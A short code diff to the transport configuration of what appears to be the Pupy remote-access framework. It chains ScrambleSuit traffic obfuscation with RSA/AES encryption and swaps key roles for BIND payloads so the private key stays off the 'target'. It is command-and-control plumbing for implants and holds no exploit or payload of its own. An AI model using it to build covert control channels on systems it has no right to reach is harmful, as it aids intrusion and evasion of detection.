@@ -14,15 +14,30 @@ class TransportConf(Transport):
     server = PupyTCPServer
     client = PupyTCPClient
     stream = PupySocketStream
-    client_transport = chain_transports(
-            ScrambleSuitClient,
-            RSA_AESClient.custom(pubkey=DEFAULT_RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
-        )
-    server_transport = chain_transports(
-            ScrambleSuitServer,
-            RSA_AESServer.custom(privkey_path="crypto/rsa_private_key.pem", rsa_key_size=4096, aes_size=256),
-        )
-    client_transport_kwargs= {"password":scramblesuit_passwd} 
-    server_transport_kwargs= {"password":scramblesuit_passwd}
+
+    def __init__(self, *args, **kwargs):
+        Transport.__init__(self, *args, **kwargs)
+
+        self.client_transport_kwargs= {"password":scramblesuit_passwd} 
+        self.server_transport_kwargs= {"password":scramblesuit_passwd}
+        if self.launcher_type == LAUNCHER_TYPE_BIND: #reversing the RSA client/server for BIND payloads so the private key doesn't go on the target
+            self.client_transport = chain_transports(
+                    ScrambleSuitClient,
+                    RSA_AESServer.custom(privkey_path="crypto/rsa_private_key.pem", rsa_key_size=4096, aes_size=256),
+                )
+            self.server_transport = chain_transports(
+                    ScrambleSuitServer,
+                    RSA_AESClient.custom(pubkey=DEFAULT_RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
+                )
+
+        else:
+            self.client_transport = chain_transports(
+                    ScrambleSuitClient,
+                    RSA_AESClient.custom(pubkey=DEFAULT_RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
+                )
+            self.server_transport = chain_transports(
+                    ScrambleSuitServer,
+                    RSA_AESServer.custom(privkey_path="crypto/rsa_private_key.pem", rsa_key_size=4096, aes_size=256),
+                )
 
 
